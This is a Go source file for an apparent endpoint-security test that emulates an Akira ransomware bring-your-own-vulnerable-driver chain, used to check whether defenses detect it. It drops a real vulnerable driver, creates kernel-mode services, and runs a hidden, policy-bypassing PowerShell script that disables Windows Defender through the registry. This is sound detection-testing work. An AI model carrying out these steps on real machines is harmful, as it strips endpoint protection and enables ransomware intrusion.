//go:build windows
//+build windows

/*
ID: c3634a9c-e8c9-44a8-992b-0faeca14f612
NAME: Akira Ransomware BYOVD Attack Chain
TECHNIQUES: T1068, T1562.001
TACTICS: privilege-escalation, defense-evasion
SEVERITY: critical
TARGET: windows-endpoint
COMPLEXITY: medium
THREAT_ACTOR: Akira
SUBCATEGORY: ransomware
TAGS: akira, byovd, vulnerable-driver, defender-tampering
UNIT: response
CREATED: 2024-12-30
AUTHOR: sectest-builder
*/
package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

// ==============================================================================
// CONFIGURATION
// ==============================================================================

const (
	TEST_UUID = "c3634a9c-e8c9-44a8-992b-0faeca14f612"
	TEST_NAME = "Akira Ransomware BYOVD Attack Chain"
)

//go:embed defender_disable.ps1
var defenderScript []byte

//go:embed rwdrv.sys
var realVulnerableDriver []byte

// ==============================================================================
// HELPER FUNCTIONS
// ==============================================================================

func checkAdminPrivileges() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

func createService(serviceName, displayName, binaryPath string) error {
	Endpoint.Say("Creating service: %s", serviceName)
	cmd := exec.Command("sc", "create", serviceName,
		"binPath=", binaryPath,
		"DisplayName=", displayName,
		"type=", "kernel",
		"start=", "demand")

	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(string(output), "already exists") {
			Endpoint.Say("Service %s already exists", serviceName)
			return nil
		}
		return fmt.Errorf("failed to create service %s: %v", serviceName, err)
	}

	Endpoint.Say("Successfully created service: %s", serviceName)
	return nil
}

func deleteService(serviceName string) error {
	Endpoint.Say("Deleting service: %s", serviceName)
	cmd := exec.Command("sc", "delete", serviceName)
	output, err := cmd.CombinedOutput()
	if err != nil && !strings.Contains(string(output), "does not exist") {
		return fmt.Errorf("failed to delete service %s: %v", serviceName, err)
	}
	return nil
}

func dropRealVulnerableDriver(targetDir string) error {
	filePath := filepath.Join(targetDir, "rwdrv.sys")

	Endpoint.Say("Dropping real vulnerable driver for signature detection: rwdrv.sys")
	err := os.WriteFile(filePath, realVulnerableDriver, 0644)
	if err != nil {
		return fmt.Errorf("failed to drop real vulnerable driver: %v", err)
	}

	Endpoint.Say("Real vulnerable driver dropped: rwdrv.sys (%d bytes)", len(realVulnerableDriver))
	return nil
}

func removeRealVulnerableDriver(targetDir string) {
	filePath := filepath.Join(targetDir, "rwdrv.sys")
	Endpoint.Say("Removing real vulnerable driver for safety")

	if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
		Endpoint.Say("Warning: Failed to remove real driver: %v", err)
	} else {
		Endpoint.Say("Real vulnerable driver safely removed")
	}
}

func simulateDriverDrop(targetDir, fileName string, size int64) error {
	filePath := filepath.Join(targetDir, fileName)

	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("failed to create %s: %v", fileName, err)
	}
	defer file.Close()

	if err := file.Truncate(size); err != nil {
		return fmt.Errorf("failed to set size for %s: %v", fileName, err)
	}

	dummyHeader := []byte{0x4D, 0x5A} // MZ header
	if _, err := file.Write(dummyHeader); err != nil {
		return fmt.Errorf("failed to write header to %s: %v", fileName, err)
	}

	Endpoint.Say("Created simulated driver: %s (%d bytes)", fileName, size)
	return nil
}

func executeDefenderDisable(scriptPath string) error {
	Endpoint.Say("Executing PowerShell script to disable Windows Defender")
	cmd := exec.Command("powershell.exe",
		"-ExecutionPolicy", "Bypass",
		"-WindowStyle", "Hidden",
		"-File", scriptPath)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("PowerShell execution failed: %v, output: %s", err, string(output))
	}

	Endpoint.Say("PowerShell script executed successfully")
	return nil
}

func checkDefenderStatus() (bool, error) {
	cmd := exec.Command("powershell.exe", "-Command",
		"Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisableAntiSpyware")

	output, err := cmd.Output()
	if err != nil {
		return false, nil // Registry key doesn't exist or access denied
	}

	result := strings.TrimSpace(string(output))
	return result == "1", nil
}

func readStatusFile(filePath string) string {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return ""
	}

	if len(data) >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
		data = data[3:]
	}
	return strings.TrimSpace(string(data))
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// ==============================================================================
// CLEANUP
// ==============================================================================

func clean() {
	Endpoint.Say("Cleaning up BYOVD test artifacts")

	// Clean up services
	deleteService("mgdsrv")
	deleteService("KMHLPSVC")

	targetDir := "c:\\F0"
	filesToClean := []string{"rwdrv.sys", "hlpdrv.sys", "defender_disable.ps1", "status.txt"}

	// Clean up all test files (including both real and simulated drivers)
	for _, fileName := range filesToClean {
		filePath := filepath.Join(targetDir, fileName)
		if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
			Endpoint.Say("Warning: Failed to remove %s: %v", fileName, err)
		} else {
			Endpoint.Say("Removed: %s", fileName)
		}
	}

	// Ensure real vulnerable driver is definitely removed (safety check)
	realDriverPath := filepath.Join(targetDir, "rwdrv.sys")
	if fileExists(realDriverPath) {
		Endpoint.Say("Safety check: Removing any remaining real vulnerable driver")
		removeRealVulnerableDriver(targetDir)
	}

	// Restore registry settings
	cmd := exec.Command("powershell.exe", "-Command",
		"Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -ErrorAction SilentlyContinue")
	cmd.Run()

	Endpoint.Say("Cleanup completed - all artifacts removed")
}

// ==============================================================================
// MAIN
// ==============================================================================

func main() {
	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA TEST: %s", TEST_NAME)
	Endpoint.Say("Test ID: %s", TEST_UUID)
	Endpoint.Say("=================================================================")

	// Schema v2.0 metadata from header
	metadata := TestMetadata{
		Version:  "1.0.0",
		Category: "ransomware",
		Severity: "critical",
		Techniques: []string{
			"T1068",     // Exploitation for Privilege Escalation
			"T1562.001", // Impair Defenses: Disable or Modify Tools
		},
		Tactics: []string{"privilege-escalation", "defense-evasion"},
		Score:   8.9,
		ScoreBreakdown: &ScoreBreakdown{
			RealWorldAccuracy:       2.6,
			TechnicalSophistication: 2.7,
			SafetyMechanisms:        1.7,
			DetectionOpportunities:  0.9,
			LoggingObservability:    1.0,
		},
		Tags: []string{"akira", "byovd", "vulnerable-driver", "defender-tampering"},
	}

	orgInfo := ResolveOrganization("")

	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	Endpoint.Say("Organization: %s", orgInfo.ShortName)
	Endpoint.Say("Execution ID: %s", executionContext.ExecutionID)

	// Panic recovery
	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
			clean()
			SaveLog(999, fmt.Sprintf("Panic: %v", r))
			os.Exit(999)
		}
	}()

	// Ensure cleanup runs on all exit paths
	defer clean()

	Endpoint.Say("Starting Akira Ransomware BYOVD Attack Chain simulation")

	if !checkAdminPrivileges() {
		Endpoint.Say("Test requires administrator privileges - exiting as not relevant")
		LogMessage("WARN", "Prerequisites", "Administrator privileges required but not available")
		SaveLog(999, "Test requires administrator privileges")
		os.Exit(999)
	}

	targetDir := "c:\\F0"
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		Endpoint.Say("Failed to create target directory: %v", err)
		LogMessage("ERROR", "Setup", fmt.Sprintf("Failed to create target directory: %v", err))
		SaveLog(999, fmt.Sprintf("Failed to create target directory: %v", err))
		os.Exit(999)
	}

	// ========================================
	// PHASE 1: SIGNATURE DETECTION TEST
	// ========================================
	LogPhaseStart(0, "Signature Detection Test")
	Endpoint.Say("Phase 1: Real vulnerable driver signature detection test")

	// Drop real vulnerable driver for signature detection
	if err := dropRealVulnerableDriver(targetDir); err != nil {
		Endpoint.Say("Failed to drop real vulnerable driver: %v", err)
		LogPhaseEnd(0, "failed", fmt.Sprintf("Failed to drop driver: %v", err))
		SaveLog(999, fmt.Sprintf("Failed to drop real vulnerable driver: %v", err))
		os.Exit(999)
	}

	Endpoint.Say("Monitoring for signature-based detection (3 seconds)")
	time.Sleep(3 * time.Second)

	realDriverPath := filepath.Join(targetDir, "rwdrv.sys")

	// Check if real driver was quarantined by signature detection
	if !fileExists(realDriverPath) {
		Endpoint.Say("Real vulnerable driver was quarantined by signature detection!")
		Endpoint.Say("System is PROTECTED - signature detection working")
		LogPhaseEnd(0, "blocked", "Real vulnerable driver quarantined by signature detection")
		LogMessage("SUCCESS", "Signature Detection", "Driver quarantined on extraction")
		SaveLog(105, "Real vulnerable driver quarantined by signature detection")
		os.Exit(105)
	}

	LogPhaseEnd(0, "success", "Real driver not detected by signatures")

	// Real driver not quarantined - remove for safety and proceed with behavioral tests
	Endpoint.Say("Real driver not detected by signatures - removing for safety")
	removeRealVulnerableDriver(targetDir)

	// ========================================
	// PHASE 2: BEHAVIORAL DETECTION TEST
	// ========================================
	LogPhaseStart(1, "Behavioral Detection Test")
	Endpoint.Say("Phase 2: Behavioral detection test with simulated drivers")

	// Now use dummy drivers for safe behavioral testing
	if err := simulateDriverDrop(targetDir, "rwdrv.sys", 15360); err != nil {
		Endpoint.Say("Failed to drop simulated rwdrv.sys: %v", err)
		LogPhaseEnd(1, "failed", fmt.Sprintf("Failed to drop simulated driver: %v", err))
		SaveLog(999, fmt.Sprintf("Failed to drop simulated rwdrv.sys: %v", err))
		os.Exit(999)
	}

	if err := simulateDriverDrop(targetDir, "hlpdrv.sys", 24576); err != nil {
		Endpoint.Say("Failed to drop simulated hlpdrv.sys: %v", err)
		LogPhaseEnd(1, "failed", fmt.Sprintf("Failed to drop simulated driver: %v", err))
		SaveLog(999, fmt.Sprintf("Failed to drop simulated hlpdrv.sys: %v", err))
		os.Exit(999)
	}

	Endpoint.Say("Checking for behavioral detection of simulated drivers")
	time.Sleep(2 * time.Second)

	rwdrvPath := filepath.Join(targetDir, "rwdrv.sys")
	hlpdrvPath := filepath.Join(targetDir, "hlpdrv.sys")

	if !fileExists(rwdrvPath) || !fileExists(hlpdrvPath) {
		Endpoint.Say("Simulated drivers were quarantined by behavioral detection")
		LogPhaseEnd(1, "blocked", "Simulated drivers quarantined by behavioral detection")
		LogMessage("SUCCESS", "Behavioral Detection", "Simulated drivers quarantined")
		SaveLog(105, "Simulated drivers quarantined by behavioral detection")
		os.Exit(105)
	}

	LogPhaseEnd(1, "success", "Simulated drivers not detected by behavioral analysis")

	// ========================================
	// PHASE 3: SERVICE CREATION TEST
	// ========================================
	LogPhaseStart(2, "Service Creation Test")
	Endpoint.Say("Phase 3: Creating malicious services")

	if err := createService("mgdsrv", "Malicious Guard Driver Service", rwdrvPath); err != nil {
		Endpoint.Say("Failed to create mgdsrv service: %v", err)
		LogPhaseEnd(2, "blocked", fmt.Sprintf("Service creation failed: %v", err))
		LogMessage("SUCCESS", "Service Creation", "Service creation was blocked")
		SaveLog(126, fmt.Sprintf("Service creation blocked: %v", err))
		os.Exit(126)
	}

	if err := createService("KMHLPSVC", "Kernel Mode Helper Service", hlpdrvPath); err != nil {
		Endpoint.Say("Failed to create KMHLPSVC service: %v", err)
		LogPhaseEnd(2, "blocked", fmt.Sprintf("Service creation failed: %v", err))
		LogMessage("SUCCESS", "Service Creation", "Service creation was blocked")
		SaveLog(126, fmt.Sprintf("Service creation blocked: %v", err))
		os.Exit(126)
	}

	LogPhaseEnd(2, "success", "Both malicious services created successfully")

	// ========================================
	// PHASE 4: REGISTRY MANIPULATION TEST
	// ========================================
	LogPhaseStart(3, "Registry Manipulation Test")
	Endpoint.Say("Phase 4: Attempting Windows Defender registry manipulation")

	scriptPath := filepath.Join(targetDir, "defender_disable.ps1")
	if err := os.WriteFile(scriptPath, defenderScript, 0644); err != nil {
		Endpoint.Say("Failed to write PowerShell script: %v", err)
		LogPhaseEnd(3, "failed", fmt.Sprintf("Failed to write script: %v", err))
		SaveLog(999, fmt.Sprintf("Failed to write PowerShell script: %v", err))
		os.Exit(999)
	}

	statusFilePath := filepath.Join(targetDir, "status.txt")

	if err := executeDefenderDisable(scriptPath); err != nil {
		Endpoint.Say("PowerShell execution blocked: %v", err)
		LogPhaseEnd(3, "blocked", fmt.Sprintf("PowerShell execution blocked: %v", err))
		LogMessage("SUCCESS", "Registry Manipulation", "PowerShell execution was blocked")
		SaveLog(126, fmt.Sprintf("PowerShell execution blocked: %v", err))
		os.Exit(126)
	}

	Endpoint.Say("Waiting for registry modifications to complete")
	time.Sleep(5 * time.Second)

	status := readStatusFile(statusFilePath)
	if status == "" {
		Endpoint.Say("Status file not found - PowerShell execution may have been blocked")
		LogPhaseEnd(3, "blocked", "Status file not found - execution may have been blocked")
		LogMessage("SUCCESS", "Registry Manipulation", "PowerShell script produced no output")
		SaveLog(126, "Status file not found - PowerShell execution may have been blocked")
		os.Exit(126)
	}

	Endpoint.Say("PowerShell status: %s", status)

	if strings.Contains(status, "DEFENDER_DISABLED") {
		Endpoint.Say("Windows Defender registry manipulation succeeded")

		disabled, err := checkDefenderStatus()
		if err != nil {
			Endpoint.Say("Failed to verify Defender status: %v", err)
		} else if disabled {
			Endpoint.Say("Defender DisableAntiSpyware registry key confirmed set to 1")
		}

		LogPhaseEnd(3, "success", "Defender registry manipulation succeeded")
		LogMessage("WARN", "Registry Manipulation", "Windows Defender registry manipulation succeeded - system unprotected")
		SaveLog(101, "Windows Defender registry manipulation succeeded - system unprotected")
		os.Exit(101)
	} else if strings.Contains(status, "ACCESS_DENIED") {
		Endpoint.Say("Registry access was denied - potential EDR protection")
		LogPhaseEnd(3, "blocked", "Registry access denied by EDR protection")
		LogMessage("SUCCESS", "Registry Manipulation", "Registry access was denied by EDR")
		SaveLog(126, "Registry access denied - EDR protection active")
		os.Exit(126)
	} else {
		Endpoint.Say("Unexpected status: %s", status)
		LogPhaseEnd(3, "blocked", fmt.Sprintf("Unexpected status: %s", status))
		LogMessage("INFO", "Registry Manipulation", fmt.Sprintf("Unexpected PowerShell status: %s", status))
		SaveLog(126, fmt.Sprintf("Unexpected PowerShell status: %s", status))
		os.Exit(126)
	}
}
